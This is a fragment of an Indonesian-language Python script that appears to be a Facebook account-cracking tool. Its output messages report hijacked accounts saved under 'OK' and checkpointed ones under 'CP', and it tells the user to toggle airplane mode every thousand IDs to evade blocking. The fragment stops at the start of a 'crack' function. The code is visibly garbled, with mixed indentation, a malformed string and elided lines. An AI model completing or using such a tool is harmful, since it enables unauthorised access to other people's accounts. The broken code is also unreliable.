...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('{b}SELAMAT MENUNGGU HASIL, SEMOGA BERUNTUNG') 
	print(f'                    {m}H {k}A {h}R {u}A {b}P {u}  ★  {b}S {u}A {h} B{k} A{m} R{b}')
	print('')
    cetak(nel('Hasil {h}OK{u} Tersimpan Di : {h}OK/%s {b}'%(okc)\nHasil {k}CP{h} Tersimpan Di : {k}CP/%s {b}'%(cpc)\nMainkan Mode Pesawat Setiap {h}1k{u} Idz\n')) 
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}➥➥➣{k} BY : POPEN NOPRIANSYAH{u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
